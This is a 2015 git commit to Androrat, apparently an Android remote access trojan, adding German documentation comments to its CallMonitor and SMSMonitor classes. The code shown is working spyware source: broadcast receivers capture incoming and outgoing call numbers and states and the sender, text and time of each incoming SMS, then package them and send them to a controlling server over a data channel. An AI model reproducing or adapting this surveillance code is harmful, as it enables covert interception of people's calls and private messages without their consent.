055e40c7f377155dcc916330033515fd9e336858
alagai-ka <alagai_ka@web.de>
2015-06-03 23:57:30 +0200

    Comment on CallMonitor and SMSMonitor

--- src/Androrat/src/my/app/Library/CallMonitor.java
+++ src/Androrat/src/my/app/Library/CallMonitor.java
@@ -13,13 +13,34 @@ import android.content.IntentFilter;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
+/**
+ * Diese Klasse ist zum Livemonitoren von eingehenden und ausgehenden Anrufen gedacht.
+ */
 public class CallMonitor {
-
+	/**
+	 * ctx Service der das Objekt erstellt
+	 */
 	ClientListener ctx;
+	/**
+	 * phoneNumberFilter Nummer nachdenen die eingehenden/ausgehenden Anrufe gefilter werden.
+	 */
 	HashSet<String> phoneNumberFilter;
+	/**
+	 * channel Datenübertragungskanal
+	 */
 	int channel;
+	/**
+	 * Boolean ob ausgehender Anruf
+	 */
 	Boolean isCalling = false;
-	
+
+	/**
+	 * Konstruktor der Klasse erstellt einen Intent Filter für eingehende und ausgehende Anrufe.
+	 * Zusätzlich werden die Klassenvariablen intialisiert
+	 * @param c	Der Service der das Objekt erstellt
+	 * @param chan	Datenübertragungskanal
+	 * @param args	Liste der Nummer nachdenen man Filtern soll.
+	 */
 	public CallMonitor(ClientListener c, int chan, byte[] args) {
 		this.ctx = c;
 		this.channel = chan;
@@ -29,54 +50,121 @@ public class CallMonitor {
         filter.addAction("android.intent.action.NEW_OUTGOING_CALL");
         ctx.registerReceiver(Callreceiver, filter);
 	}
-	
+
+	/**
+	 * Beende des BroadcastReceiver
+	 */
 	public void stop() {
 		ctx.unregisterReceiver(Callreceiver);
 	}
-	
-	
+
+	/**
+	 * Erstellen des BroadcastReceiver
+	 */
 	protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
 		 private static final String TAG = "CallReceiver";
 		 
 		@Override
+		/**
+		 * Kommt ein entsprechender Intent an, der auf den Filter passt so wird diese Methode aufgerufen.
+		 * @param context Der Kontext
+		 * @param intent Der ankommende Intent
+		 */
 		public void onReceive(final Context context, final Intent intent) {
 			//Log.i(TAG, "Call state changed !");
+			/**
+			 * Die Intent-Action wird in der Variablen action gespeichert.
+			 */
 			final String action = intent.getAction();
-
+			/**
+			 * Überprüfen ob es sich um einen ausgehenden Anruf handelt
+ 			 */
 			if(action.equals(Intent.ACTION_NEW_OUTGOING_CALL)){
+				/**
+				 * Auslesen der Telefonnummer
+				 */
 				String number=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 				Log.i(TAG,"Outgoing call to "+number);
+				/**
+				 * Neues Callstatuspacket erstellen mit der Nummer und dem Status
+				 */
 				ctx.handleData(channel, new CallStatusPacket(4, number).build());
+				/**
+				 * isCalling wir auf true gesetzt.
+				 */
 				isCalling = true;
 			}
+			/**
+			 * Überprüfen ob es ein eingehender Anruf ist.
+			 */
 			else if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
-
+				/**
+				 * Extra Status für eingehende Anrufe auslesen und in phoneState speichern.
+				 */
 				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
+				/**
+				 * Nummer des eingehenden Anrufs auslesen und in phoneNumber speichern.
+				 */
 				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
-				
+				/**
+				 * Überprüfen ob es eine Nummer und einen Filter gibt.
+				 */
 				if(phoneNumber != null && phoneNumberFilter != null) {
+					/**
+					 * Wenn ein Filter vorhanden überprüfen ob die Nummer im Filter vorkommt.
+					 * Ist die nicht der Fall wird die Methode beendet.
+					 */
 					if(!phoneNumberFilter.contains(phoneNumber))
 						return;
 				}
-				
+				/**
+				 * Überprüfen ob der Anruf immer noch klingelt.
+				 */
 				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
 					//Log.i(TAG,"Incoming call of"+phoneNumber);
+					/**
+					 * Entsprechende CallStatusPacket erstellen und abschicken.
+					 */
 					ctx.handleData(channel, new CallStatusPacket(1, phoneNumber).build());
 				}
+				/**
+				 * Überprüfen ob der Anruf beendet wurde oder abgelehtn
+				 */
 				else if(phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
 					if(phoneNumber == null) {
 						Log.i(TAG, "Hang Up/Refused");
+						/**
+						 * Entprechendes CallStatusPacket erstellen und abschicken.
+						 */
 						ctx.handleData(channel, new CallStatusPacket(5, phoneNumber).build());
 					}
 					else {
+						/**
+						 * Wenn dieser Teil erreicht wird so wurde der ANruf verpasst
+						 */
 						Log.i(TAG,"Missed call of "+phoneNumber); //not null call missed, null hang up, or refused
+						/**
+						 * Erstellen des entsprechenden CallStatusPackets.
+						 */
 						ctx.handleData(channel, new CallStatusPacket(2, phoneNumber).build());
 					}
+					/**
+					 * isCalling auf false setzen.
+					 */
 					isCalling = false;
 				}
+				/**
+				 * Überprüfen ob es einen Anruf gibt der gerade wählt, aktiv ist oder pausiert.
+				 */
 				else if(phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
+					/**
+					 * aktiver anruf
+					 */
 					if(!isCalling) {
 						Log.i(TAG,"Reçu décroché of "+phoneNumber);
+						/**
+						 * CallStatuspacket erstellen und versenden.
+						 */
 						ctx.handleData(channel, new CallStatusPacket(3, phoneNumber).build());
 					}
 				}
--- src/Androrat/src/my/app/Library/SMSMonitor.java
+++ src/Androrat/src/my/app/Library/SMSMonitor.java
@@ -16,55 +16,128 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
+/**
+ * Diese Klasse ist für das SMSLiveMonitorung zuständig.
+ */
 public class SMSMonitor {
-
+	/**
+	 * ctx  Der Service der das Objekt erstellt.
+	 */
 	ClientListener ctx;
+	/**
+	 * phoneNumberFilter Filter um die SMS nach bestimmten Telefonnummern zu filtern.
+	 */
 	HashSet<String> phoneNumberFilter;
+	/**
+	 * channel Datenübertragungskanal
+	 */
 	int channel;
-	
+
+	/**
+	 * Konstruktor der Klasse befüllt die Klassenvariablen und erstell einen Intentfilter.
+	 * @param c	Service der das Obejkt erstellt.
+	 * @param chan	Datenübertragungskanal
+	 * @param args	Telefonnummern nachdenen gefiltert werden soll.
+	 */
 	public SMSMonitor(ClientListener c, int chan, byte[] args) {
 		this.ctx = c;
 		this.channel = chan;
 		phoneNumberFilter = EncoderHelper.decodeHashSet(args);
+		/**
+		 * IntentFilter erstellen, der nur Eingeheden SMS zulässt.
+		 */
         IntentFilter filter = new IntentFilter();
         filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //On enregistre un broadcast receiver sur la reception de SMS
+		/**
+		 * Erstellen eines BradcastReseiver, der nur Intents für die der Intentfilter bestimmt ist empfängt.
+		 */
         ctx.registerReceiver(SMSreceiver, filter);
 	}
-	
+
+	/**
+	 * Beendet den BroadcastReceiver.
+	 */
 	public void stop() {
 		ctx.unregisterReceiver(SMSreceiver);
 	}
-	
+
+	/**
+	 * Erstelen der BradcastReceiver.
+	 */
 	protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {
-	 	
+		/**
+		 * Hiernach wird gesucht. Haben die Intents diesen Action werden sie verarbeitet.
+		 */
 	 	private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 	 
         @Override
+		/**
+		 * Sobald ein Intent ankommt wird diese Funktion aufgerufen
+		 * @param context	Der Kontext
+		 * @param intent Der empfangene Intent
+		 */
         public void onReceive(Context context, Intent intent) {
-
+			/**
+			 * Hier wird überprüft ob es sich auch im einen eingehenden SMSIntent handelt
+			 */
 		 	if(intent.getAction().equals(SMS_RECEIVED)) { //On vérifie que c'est bien un event de SMS_RECEIVED même si c'est obligatoirement le cas.
 		 		Log.i("SMSReceived", "onReceive sms !");
-		 		
+				/**
+				 * Hier werden die Daten aus dem Intent extrahiert.
+				 */
 				Bundle bundle = intent.getExtras();
+				/**
+				 * Überprüfen ob das Bundel Daten enthält
+				 */
 				if (bundle != null) {
+					/**
+					 *Inhalt der SMS aus dem Bundle extrahieren
+					 */
 					Object[] pdus = (Object[]) bundle.get("pdus");
-					 
+					/**
+					 * SMSMeassage Array erstellen um an die Daten zu kommen.
+					 */
 					final SmsMessage[] messages = new SmsMessage[pdus.length];
+					/**
+					 * Daten in das message Array kopieren.
+					 */
 					for (int i = 0; i < pdus.length; i++)  {
 						 messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 					}
+					/**
+					 * Überprüfen ob das message-Array Daten enthält.
+					 */
 					if (messages.length > -1) {
-						
+						/**
+						 * Auslesen des Messagebody also der Nachricht.
+						 */
 						 String messageBody = messages[0].getMessageBody();
+						/**
+						 * Auslesen der Telefonnummern, von welcher die Nachricht gesendet wurde.
+						 */
 						 String phoneNumber = messages[0].getDisplayOriginatingAddress();
+						/**
+						 * Auslesen des zeitpunkts wann die Nachricht gesendet wurde.
+						 */
 						 long date = messages[0].getTimestampMillis();
-						 
+						/**
+						 * Überprüfen ob ein Filter aktiv ist.
+						 */
 						 if(phoneNumberFilter == null) {
+							 /**
+							  * Wenn nicht ein SMSPacker erstellen und diese an den Server senden.
+							  */
 							 	ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
 								ctx.handleData(channel, sms.build());
 						 }
 						 else {
+							 /**
+							  * Falls Filter aktiv, überprüfen ob die Telefonnummer in dem Filter vorhanden ist.
+							  */
 							 if (phoneNumberFilter.contains(phoneNumber)) {
+								 /**
+								  * Wenn dei Nummer vorhanden ist, neues SMSPacket erstellen und dieses an den Server schicken.
+								  */
 								 Log.i("SMSReceived", "Message accepted as triggering message !");
 								 ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
 								 ctx.handleData(channel, sms.build());
